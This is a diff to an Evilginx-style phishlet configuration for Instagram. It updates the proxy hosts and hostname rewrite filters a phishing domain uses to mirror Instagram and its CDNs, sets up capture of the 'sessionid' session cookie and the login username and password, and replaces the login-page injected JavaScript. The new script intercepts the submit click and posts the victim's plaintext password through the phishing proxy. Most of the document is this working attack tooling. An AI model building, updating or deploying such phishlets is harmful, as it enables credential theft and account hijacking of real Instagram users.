@@ -2,17 +2,24 @@ author: '@charlesbel'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
-  - {phish_sub: 'm', orig_sub: 'm', domain: 'instagram.com', session: true, is_landing: false}
+  - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'instagram.com', session: false, is_landing: false}
+  - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false}
+  - {phish_sub: 'img', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'static-cdn', orig_sub: 'static', domain: 'cdninstagram.com', session: false, is_landing: false}
+  - {phish_sub: 'scontent-cdn', orig_sub: 'scontent', domain: 'cdninstagram.com', session: false, is_landing: false}
 sub_filters:
-  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
-  - {triggers_on: 'm.instagram.com', orig_sub: 'm', domain: 'instagram.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'graphql', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: 'static', domain: 'cdninstagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'img.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\\\/v\\\/)', replace: 'img.{domain}\\/v\\/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
   - domain: '.instagram.com'
     keys: ['sessionid','.*,regexp']
 credentials:
   username:
-    key: 'user'
+    key: 'username'
     search: '(.*)'
     type: 'post'
   password:
@@ -27,19 +34,53 @@ js_inject:
     trigger_paths: ["/accounts/login"]
     trigger_params: []
     script: |
-      function onclickListener(){
-        var submit = document.querySelectorAll('button[type=submit]')[0];
-        submit.setAttribute("onclick", "sendPass()");
-        return;
-      }
-      function sendPass(){
-        var password = document.getElementsByName("password")[0].value;
-
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", '/accounts/login/ajax/', true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.send("unenc_password="+encodeURIComponent(password));
-
-        return;
-      }
-      setTimeout(function(){ onclickListener(); }, 1000);
+      const waitForEl = (selector) => {
+        return new Promise((resolve) => {
+          if (document.querySelector(selector)) {
+            return resolve(document.querySelector(selector));
+          }
+          const observer = new MutationObserver((mutations) => {
+            if (document.querySelector(selector)) {
+              resolve(document.querySelector(selector));
+              observer.disconnect();
+            }
+          });
+          observer.observe(document.body, {
+            childList: true,
+            subtree: true,
+          });
+        });
+      };
+      waitForEl("form[id=loginForm]").then(() => {
+        let subButton = document.querySelector("button[type=submit]");
+        let parent = subButton.parentElement;
+        async function a(ev) {
+          ev.stopPropagation();
+          ev.preventDefault();
+          if (!subButton.disabled) {
+            var password = document.getElementsByName("password")[0].value;
+            await fetch("/accounts/login/ajax/", {
+              method: "POST",
+              headers: { "Content-Type": "application/x-www-form-urlencoded" },
+              body: "unenc_password=" + encodeURIComponent(password),
+            });
+            parent.removeEventListener("click", a, true);
+            ev.target.click();
+          }
+        }
+        parent.addEventListener("click", a, true);
+        new MutationObserver(function (mutations) {
+          mutations.forEach(function (mutation) {
+            if (
+              mutation.type == "attributes" &&
+              mutation.attributeName == "disabled" &&
+              mutation.target.disabled == true
+            ) {
+              parent.removeEventListener("click", a, true);
+              parent.addEventListener("click", a, true);
+            }
+          });
+        }).observe(document.querySelector("button[type=submit]"), {
+          attributes: true,
+        });
+      });
